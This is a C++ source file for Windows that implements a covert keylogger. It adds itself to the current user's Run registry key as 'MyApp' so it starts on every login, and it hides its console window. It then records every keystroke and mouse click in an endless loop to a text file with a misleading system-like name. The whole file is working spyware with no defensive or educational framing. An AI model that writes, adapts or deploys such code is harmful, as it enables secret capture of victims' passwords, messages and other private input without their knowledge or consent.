#include <iostream>
#include <Windows.h>
#include <conio.h>

using namespace std;

void Save(int _key, const char* file);
bool CheckCapsLockKeyState();

int main()
{
    char re[MAX_PATH];
    string FP = string(re, GetModuleFileNameA(NULL, re, MAX_PATH));
    HKEY hkey;
    LONG key = RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\Currentversion\\Run", 0, KEY_WRITE, &hkey);
    if (ERROR_SUCCESS == key)
    {
        key = RegSetValueExA(hkey, "MyApp", 0, REG_SZ, (BYTE*)FP.c_str(), strlen(FP.c_str()));
    }

    ShowWindow(GetConsoleWindow(), SW_HIDE);
    char i;
    while (true) {
        for (i = 8; i <= 255; i++) {
            if (GetAsyncKeyState(i) == -32767)
                Save(i, "syssrasdclassifiermodelnodepth.txt");
        }
    }
    return 0;
}

void Save(int _key, const char* file)
{
    cout << _key << endl;
    FILE* OUTPUT_FILE;
    OUTPUT_FILE = fopen(file, "a+");
    char pressed_key_letter = char(_key);
    if (_key == VK_LBUTTON)
        fprintf(OUTPUT_FILE, "%s", "[MOUSE_LBUTTON]");
    else if (_key == VK_RBUTTON)
        fprintf(OUTPUT_FILE, "%s", "[MOUSE_RBUTTON]");
    else if (_key == VK_CANCEL)
        fprintf(OUTPUT_FILE, "%s", "[CTRL_BPRCS]");
    else if (_key == VK_MBUTTON)
        fprintf(OUTPUT_FILE, "%s", "[MOUSE_MBUTTON]");
    else if (_key == VK_XBUTTON1)
        fprintf(OUTPUT_FILE, "%s", "[X1BUTTON]");
    else if (_key == VK_XBUTTON2)
        fprintf(OUTPUT_FILE, "%s", "[X2BUTTON]");
    else if (_key == VK_BACK)
        fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
    else if (_key == VK_TAB)
        fprintf(OUTPUT_FILE, "%s", "[TAB]");
    else if (_key == VK_CLEAR)
        fprintf(OUTPUT_FILE, "%s", "[CLEAR]");
    else if (_key == VK_RETURN)
        fprintf(OUTPUT_FILE, "%s", "[ENTER]");
    else if (_key == VK_SHIFT)
        fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
    else if (_key == VK_MENU)
        fprintf(OUTPUT_FILE, "%s", "[ALT]");
    else if (_key == VK_PAUSE)
        fprintf(OUTPUT_FILE, "%s", "[PAUSE]");
    else if (_key == VK_CAPITAL)
        fprintf(OUTPUT_FILE, "%s", "[CAPSLOCK]");
    else if (_key == VK_KANA)
        fprintf(OUTPUT_FILE, "%s", "[IME Kana mode]");
    else if (_key == VK_HANGUL)
        fprintf(OUTPUT_FILE, "%s", "[IME Hangul mode]");
    else if (_key == VK_JUNJA)
        fprintf(OUTPUT_FILE, "%s", "[IME Junja mode]");
    else if (_key == VK_FINAL)
        fprintf(OUTPUT_FILE, "%s", "[IME final mode]");
    else if (_key == VK_HANJA)
        fprintf(OUTPUT_FILE, "%s", "[IME Hanja mode]");
    else if (_key == VK_KANJI)
        fprintf(OUTPUT_FILE, "%s", "[IME Kanji mode]");
    else if (_key == VK_ESCAPE)
        fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
    else if (_key == VK_CONVERT)
        fprintf(OUTPUT_FILE, "%s", "[IME convert]");
    else if (_key == VK_NONCONVERT)
        fprintf(OUTPUT_FILE, "%s", "[IME nonconvert]");
    else if (_key == VK_ACCEPT)
        fprintf(OUTPUT_FILE, "%s", "[IME accept]");
    else if (_key == VK_MODECHANGE)
        fprintf(OUTPUT_FILE, "%s", "[IME mode change request]");
    else if (_key == VK_SPACE)
        fprintf(OUTPUT_FILE, "%s", "[SPACEBAR]");
    else if (_key == VK_PRIOR)
        fprintf(OUTPUT_FILE, "%s", "[PAGEUP]");
    else if (_key == VK_NEXT)
        fprintf(OUTPUT_FILE, "%s", "[PAGEDOWN]");
    else if (_key == VK_END)
        fprintf(OUTPUT_FILE, "%s", "[END]");
    else if (_key == VK_HOME)
        fprintf(OUTPUT_FILE, "%s", "[HOME]");
    else if (_key == VK_LEFT)
        fprintf(OUTPUT_FILE, "%s", "[LEFT_ARROW]");
    else if (_key == VK_UP)
        fprintf(OUTPUT_FILE, "%s", "[UP ARROW]");
    else if (_key == VK_RIGHT)
        fprintf(OUTPUT_FILE, "%s", "[RIGHT ARROW]");
    else if (_key == VK_DOWN)
        fprintf(OUTPUT_FILE, "%s", "[DOWN ARROW]");
    else if (_key == VK_SELECT)
        fprintf(OUTPUT_FILE, "%s", "[SELECT]");
    else if (_key == VK_PRINT)
        fprintf(OUTPUT_FILE, "%s", "[PRINT]");
    else if (_key == VK_EXECUTE)
        fprintf(OUTPUT_FILE, "%s", "[EXECUTE]");
    else if (_key == VK_SNAPSHOT)
        fprintf(OUTPUT_FILE, "%s", "[PRINT_SCREEN]");
    else if (_key == VK_INSERT)
        fprintf(OUTPUT_FILE, "%s", "[INSERT]");
    else if (_key == VK_DELETE)
        fprintf(OUTPUT_FILE, "%s", "[DELETE]");
    else if (_key == VK_HELP)
        fprintf(OUTPUT_FILE, "%s", "[HELP]");
    else if (_key == VK_CONTROL)
        fprintf(OUTPUT_FILE, "%s", "[CRTL]");
    else
    {
        if (CheckCapsLockKeyState() == true) 
            fprintf(OUTPUT_FILE, "%c", char(toupper(pressed_key_letter)));
        else
            fprintf(OUTPUT_FILE, "%c", char(tolower(pressed_key_letter)));
    }

    fclose(OUTPUT_FILE);
}

bool CheckCapsLockKeyState()
{
    if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
        return true;
    else
        return false;
}